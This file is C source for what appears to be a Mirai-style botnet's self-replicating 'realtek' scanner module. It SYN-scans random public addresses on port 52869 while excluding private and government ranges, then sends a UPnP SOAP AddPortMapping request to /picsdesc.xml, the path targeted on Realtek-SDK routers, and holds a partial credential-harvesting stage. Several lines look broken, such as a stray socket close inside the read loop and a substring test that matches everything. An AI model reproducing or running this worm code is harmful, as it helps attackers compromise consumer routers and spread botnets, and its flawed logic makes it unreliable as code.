#ifdef SELFREP
#define _GNU_SOURCE
#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include "includes.h"
#include "realtek.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
int realtek_scanner_pid = 0, realtek_rsck = 0, realtek_rsck_out = 0, realtek_auth_table_len = 0;
char realtek_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct realtek_scanner_auth *realtek_auth_table = NULL;
struct realtek_scanner_connection *conn_table;
uint16_t realtek_realtek_auth_table_max_weight = 0;
uint32_t realtek_fake_time = 0;
int rtek[] = {180,190,191,210,200,153,185,186,188,192,193,194,195,196,197,198,199,201,202,203,204,205,206,207,208,209,211,212,213,214,215,216,217,218,219,220};
int realtek_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);
    if(ret > 0)
    {
        int i = 0;
        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }
    return ret;
}
void realtek_scanner(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;
    realtek_scanner_pid = fork();
    if(realtek_scanner_pid > 0 || realtek_scanner_pid == -1)
        return;
    LOCAL_ADDR = util_local_addr();
    rand_init();
    realtek_fake_time = time(NULL);
    conn_table = calloc(REALTEK_SCANNER_MAX_CONNS, sizeof(struct realtek_scanner_connection));
    for(i = 0; i < REALTEK_SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = REALTEK_SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].credential_index = 0;
    }
    if((realtek_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[scanner] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    fcntl(realtek_rsck, F_SETFL, O_NONBLOCK | fcntl(realtek_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(realtek_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        #ifdef DEBUG
            printf("[scanner] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(realtek_rsck);
        exit(0);
    }
    do
    {
        source_port = rand_next() & 0xffff;
    }
    while(ntohs(source_port) < 1024);
    iph = (struct iphdr *)realtek_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    tcph->dest = htons(52869);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;
    #ifdef DEBUG
        printf("[scanner] scanner process initialized. scanning started.\n");
    #endif
    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct realtek_scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
        if(realtek_fake_time != last_spew)
        {
            last_spew = realtek_fake_time;
            for(i = 0; i < REALTEK_SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)realtek_scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_realtek_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->dest = htons(52869);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;
                sendto(realtek_rsck, realtek_scanner_rawpkt, sizeof(realtek_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }
        last_avail_conn = 0;
        while(TRUE)
        {
            int n = 0;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct realtek_scanner_connection *conn;
            errno = 0;
            n = recvfrom(realtek_rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;
            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDR)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            if(tcph->source != htons(52869))
                continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;
            conn = NULL;
            for(n = last_avail_conn; n < REALTEK_SCANNER_MAX_CONNS; n++)
            {
                if(conn_table[n].state == REALTEK_SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }
            if(conn == NULL)
                break;
            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            realtek_setup_connection(conn);
        }
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for(i = 0; i < REALTEK_SCANNER_MAX_CONNS; i++)
        {
            int timeout = 5;
            conn = &conn_table[i];
            if(conn->state != REALTEK_SC_CLOSED && (realtek_fake_time - conn->last_recv) > timeout)
            {
                #ifdef DEBUG
                    printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
                #endif
                close(conn->fd);
                conn->fd = -1;
                conn->state = REALTEK_SC_CLOSED;
                free(conn->credentials);
                conn->credential_index = 0;
                util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                continue;
            }
            if(conn->state == REALTEK_SC_CONNECTING || conn->state == REALTEK_SC_EXPLOIT_STAGE2 || conn->state == REALTEK_SC_EXPLOIT_STAGE3)
            {
                FD_SET(conn->fd, &fdset_wr);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != REALTEK_SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }
        tim.tv_usec = 0;
        tim.tv_sec = 3;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        realtek_fake_time = time(NULL);
        for(i = 0; i < REALTEK_SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];
            if(conn->fd == -1)
                continue;
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof(err);
                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err == 0 && ret == 0)
                {
                    if(conn->state == REALTEK_SC_EXPLOIT_STAGE2)
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d request sent to %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        #endif
                        util_strcpy(conn->payload_buf, "POST /picsdesc.xml HTTP/1.1\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>1234</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>1234</NewInternalPort><NewInternalClient>192.168.1.1</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>test</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>");
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
						conn->state = REALTEK_SC_CLOSED;
                        close(conn->fd);
                        conn->fd = -1;
                        continue;
                    }
                    else if(conn->state == REALTEK_SC_EXPLOIT_STAGE3)
                    {
                        conn->state = REALTEK_SC_CLOSED;
                        continue;
                    }
                    else
                    {
                        conn->credentials = malloc(256);
                        conn->state = REALTEK_SC_EXPLOIT_STAGE2;
                    }
                }
                else
                {
                    #ifdef DEBUG
                        printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
                    #endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = REALTEK_SC_CLOSED;
                    continue;
                }
            }
            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(TRUE)
                {
                    int ret = 0;
                    if(conn->state == REALTEK_SC_CLOSED)
                        break;
						close(conn->fd);
                    if(conn->rdbuf_pos == REALTEK_SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + REALTEK_SCANNER_HACK_DRAIN, REALTEK_SCANNER_RDBUF_SIZE - REALTEK_SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= REALTEK_SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = realtek_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, REALTEK_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d connection gracefully closed (stage %d)\n", conn->fd, conn->state);
                        #endif
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            if(conn->state == REALTEK_SC_EXPLOIT_STAGE2)
                            {
                                #ifdef DEBUG
                                    printf("[scanner] FD%d resetting connection preparing to continue with stage 2 of the exploit\n", conn->fd);
                                #endif
                                close(conn->fd);
                                realtek_setup_connection(conn);
                                continue;
                            }
                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = REALTEK_SC_CLOSED;
                            free(conn->credentials);
                            conn->credential_index = 0;
                            util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = realtek_fake_time;
                    int len = util_strlen(conn->rdbuf);
                    conn->rdbuf[len] = 0;
                    if(conn->state == REALTEK_SC_GET_CREDENTIALS)
                    {
                        char *out = strtok(conn->rdbuf, " ");
                        while(out != NULL)
                        {
                            if(strstr(out, ""))
                            {
                                #ifdef DEBUG
                                    printf("[scanner] FD%d parsing credentials...\n", conn->fd);
                                #endif
                                memmove(out, out + 11, strlen(out));
                                int i = 0;
                                for(i = 0; i < strlen(out); i++)
                                {
                                    if(out[i] == ';' || out[i] == '"' || out[i] == ' ')
                                        out[i] = 0;
                                }
                                conn->credentials[conn->credential_index] = strdup(out);
                                conn->credential_index++;
                            }
                            out = strtok(NULL, " ");
                        }
                    }
                    if(conn->credentials[0] == NULL && conn->credentials[1] == NULL)
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d failed to retrieve credentials\n", conn->fd);
                        #endif
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = REALTEK_SC_CLOSED;
                        free(conn->credentials);
                        conn->credential_index = 0;
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                    }
                    else
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d retrieved user: %s, pass: %s changing exploit stages\n", conn->fd, conn->credentials[0], conn->credentials[1]);
                        #endif
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = REALTEK_SC_EXPLOIT_STAGE2;
                        conn->credential_index = 0;
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                    }
                }
            }
        }
    }
}
void realtek_kill(void)
{
    kill(realtek_scanner_pid, 9);
}
static void realtek_setup_connection(struct realtek_scanner_connection *conn)
{
    struct sockaddr_in addr = {0};
    if(conn->fd != -1)
        close(conn->fd);
    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[scanner] failed to call socket()\n");
        #endif
        return;
    }
    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;
    conn->last_recv = realtek_fake_time;
    if(conn->state == REALTEK_SC_EXPLOIT_STAGE2 || conn->state == REALTEK_SC_EXPLOIT_STAGE3)
    {
    }
    else
    {
        conn->state = REALTEK_SC_CONNECTING;
    }
    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}
static ipv4_t get_random_realtek_ip(void)
{
    uint32_t tmp;
    uint8_t o1 = 0, o2 = 0, o3 = 0, o4 = 0;
    do
    {
        tmp = rand_next();
        srand(time(NULL));
        int range = rand() % (sizeof(rtek)/sizeof(char *));
        o1 = rtek[range];
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while(o1 == 127 ||                             
          (o1 == 0) ||                              
          (o1 == 3) ||                              
          (o1 == 15 || o1 == 16) ||                 
          (o1 == 56) ||                             
          (o1 == 10) ||                             
          (o1 == 192 && o2 == 168) ||               
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    
          (o1 == 169 && o2 > 254) ||                
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     
          (o1 >= 224) ||                            
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) 
    );
    return INET_ADDR(o1,o2,o3,o4);
}
#endif
